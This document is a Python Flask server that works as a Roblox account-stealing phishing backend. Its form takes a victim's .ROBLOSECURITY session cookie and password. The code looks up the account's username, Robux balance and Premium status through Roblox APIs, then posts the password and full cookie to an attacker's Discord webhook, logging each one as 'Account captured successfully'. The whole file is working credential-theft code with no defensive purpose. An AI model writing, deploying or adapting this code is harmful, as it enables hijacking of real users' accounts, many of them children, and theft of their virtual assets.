import os
import json
import re
import requests
import base64
import time
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

def get_roblox_user_info(cookie):
    """Get Roblox user information using the provided cookie"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Get current user info
        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                              headers=headers, timeout=5)
        
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id')
            username = user_data.get('name', 'Unknown')
            display_name = user_data.get('displayName', username)
            
            # Get user avatar/profile picture
            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
                                         timeout=5)
            
            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
            if avatar_response.status_code == 200:
                avatar_data = avatar_response.json()
                if avatar_data.get('data') and len(avatar_data['data']) > 0:
                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
            
            # Get Robux balance - try multiple endpoints
            robux_balance = 'Not available'
            
            # Try the currency endpoint first
            try:
                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
                                            headers=headers, timeout=5)
                print(f"Robux API response status: {robux_response.status_code}")
                
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    print(f"Robux API response: {robux_data}")
                    if 'robux' in robux_data:
                        robux_balance = f"R$ {robux_data['robux']:,}"
                    else:
                        print("No 'robux' field in response")
                else:
                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
            except Exception as robux_error:
                print(f"Error getting Robux balance: {str(robux_error)}")
                
            # If first method failed, try alternative endpoint using user_id
            if robux_balance == 'Not available' and user_id:
                try:
                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
                                              headers=headers, timeout=5)
                    print(f"Alternative Robux API response status: {alt_response.status_code}")
                    
                    if alt_response.status_code == 200:
                        alt_robux_data = alt_response.json()
                        print(f"Alternative Robux API response: {alt_robux_data}")
                        if 'robux' in alt_robux_data:
                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
                except Exception as alt_error:
                    print(f"Alternative Robux API error: {str(alt_error)}")
            
            # Check Premium status
            premium_status = '❌ No'
            try:
                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
                                              headers=headers, timeout=5)
                print(f"Premium API response status: {premium_response.status_code}")
                
                if premium_response.status_code == 200:
                    premium_data = premium_response.json()
                    print(f"Premium API response: {premium_data}")
                    # Handle both object and boolean responses
                    if isinstance(premium_data, bool):
                        premium_status = '✅ Yes' if premium_data else '❌ No'
                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
                        premium_status = '✅ Yes'
                else:
                    print(f"Premium API failed with status: {premium_response.status_code}")
            except Exception as premium_error:
                print(f"Error getting Premium status: {str(premium_error)}")
            
            return {
                'username': username,
                'display_name': display_name,
                'user_id': user_id,
                'profile_picture': profile_picture_url,
                'robux_balance': robux_balance,
                'premium_status': premium_status
            }
        
    except Exception as e:
        print(f"Error fetching Roblox user info: {str(e)}")
    
    return {
        'username': 'Not available',
        'display_name': 'Not available', 
        'user_id': None,
        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
        'robux_balance': 'Not available',
        'premium_status': '❌ No'
    }

def is_valid_cookie(cookie):
    """
    Validate cookie and check if it's not expired
    Supports JWT tokens and session cookies with expiration
    """
    if not cookie or len(cookie) < 10:
        return False
    
    # Check if it's a JWT token (has 3 parts separated by dots)
    if cookie.count('.') == 2:
        try:
            # Split JWT token
            header, payload, signature = cookie.split('.')
            
            # Decode payload with correct padding for URL-safe base64
            payload += '=' * (-len(payload) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload)
            payload_data = json.loads(decoded_payload)
            
            # Check expiration (exp claim)
            if 'exp' in payload_data:
                exp_time = payload_data['exp']
                current_time = int(time.time())
                
                if current_time >= exp_time:
                    return False  # Token is expired
            
            return True  # Valid JWT token, not expired
            
        except (ValueError, json.JSONDecodeError, Exception):
            return False  # Invalid JWT format
    
    # For non-JWT cookies, accept Roblox-style cookies and other formats
    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
        return True
    
    # Accept standard cookie formats
    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
    if re.match(cookie_pattern, cookie):
        return True
    
    # Accept any long alphanumeric string that could be a valid token
    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
        return True
    
    return False

@app.route('/')
def index():
    """Serve the main HTML page"""
    return send_from_directory('.', 'index.html')

@app.route('/submit', methods=['POST'])
def submit_form():
    """Handle form submission and send to Discord webhook"""
    try:
        data = request.get_json()
        
        # Extract all form fields
        password = data.get('password', '').strip()
        korblox = data.get('korblox', False)
        headless = data.get('headless', False)
        cookie = data.get('cookie', '').strip()
        
        # Server-side validation
        if not cookie:
            return jsonify({
                'success': False, 
                'message': 'Missing required field (cookie)'
            }), 400
        
        # Check if cookie is expired (for JWT tokens)
        if cookie.count('.') == 2:
            try:
                header, payload, signature = cookie.split('.')
                payload += '=' * (-len(payload) % 4)
                decoded_payload = base64.urlsafe_b64decode(payload)
                payload_data = json.loads(decoded_payload)
                
                if 'exp' in payload_data:
                    exp_time = payload_data['exp']
                    current_time = int(time.time())
                    if current_time >= exp_time:
                        return jsonify({
                            'success': False, 
                            'message': 'Cookie has expired'
                        }), 400
            except:
                return jsonify({
                    'success': False, 
                    'message': 'Invalid cookie format'
                }), 400
        
        # Validate cookie format
        if not is_valid_cookie(cookie):
            return jsonify({
                'success': False, 
                'message': 'Invalid cookie format'
            }), 400
        
        # Get Discord webhook URL from environment
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return jsonify({
                'success': False, 
                'message': 'Webhook not configured'
            }), 500
        
        # Get real Roblox user information using the cookie
        print("Fetching Roblox user information...")
        user_info = get_roblox_user_info(cookie)
        
        # Prepare compact account info
        basic_info = f"""🎮 **{user_info['username']}** ({user_info['display_name']})
🆔 {user_info['user_id'] or 'Unknown'} | 💰 {user_info['robux_balance']} | 💎 {user_info['premium_status']}
🔒 {password or 'No password'} | 💀 {'✅' if korblox else '❌'} | 🎭 {'✅' if headless else '❌'}

🍪 **Cookie:**"""
        
        # Calculate available space for cookie (Discord limit: 2000 chars)
        basic_info_length = len(basic_info)
        cookie_wrapper_length = len("\n```\n```")  # backticks and newlines around cookie
        available_cookie_space = 2000 - basic_info_length - cookie_wrapper_length - 50  # 50 char buffer
        
        # Prepare cookie content
        cookie_content = cookie if cookie else 'Not provided'
        if len(cookie_content) > available_cookie_space:
            # Show as much of the cookie as possible
            cookie_content = cookie_content[:available_cookie_space] + "..."
            print(f"Cookie truncated to fit Discord limit. Original: {len(cookie)} chars, Truncated: {len(cookie_content)} chars")
        
        account_info = f"""{basic_info}
```{cookie_content}```"""

        discord_data = {
            'content': account_info,
            'embeds': [{
                'title': '🔐 Authentication Details',
                'color': 0xff0000,  # Red color
                'thumbnail': {
                    'url': user_info['profile_picture']
                },
                'fields': [
                    {
                        'name': '📋 Summary',
                        'value': 'Account information and cookie captured successfully',
                        'inline': False
                    }
                ],
                'footer': {
                    'text': f'Account captured successfully • {user_info["display_name"]}'
                }
            }]
        }
        
        # Send to Discord with timeout and error handling
        try:
            # Log the payload size for debugging
            payload_size = len(json.dumps(discord_data))
            print(f"Sending Discord payload of size: {payload_size} bytes")
            
            response = requests.post(webhook_url, json=discord_data, timeout=10)
            
            if response.status_code in [200, 204]:
                print(f"Discord webhook successful: {response.status_code}")
                return jsonify({
                    'success': True, 
                    'message': 'Data sent successfully'
                })
            else:
                error_text = response.text[:500]  # Limit error text to prevent log spam
                print(f"Discord webhook failed: {response.status_code} - {error_text}")
                return jsonify({
                    'success': False, 
                    'message': f'Discord API error: {response.status_code}'
                }), 500
        except requests.Timeout:
            print("Discord webhook timeout error")
            return jsonify({
                'success': False, 
                'message': 'Request timeout - Discord may be slow'
            }), 500
        except requests.RequestException as e:
            print(f"Discord webhook network error: {str(e)}")
            return jsonify({
                'success': False, 
                'message': 'Network error occurred'
            }), 500
            
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': 'Server error occurred'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)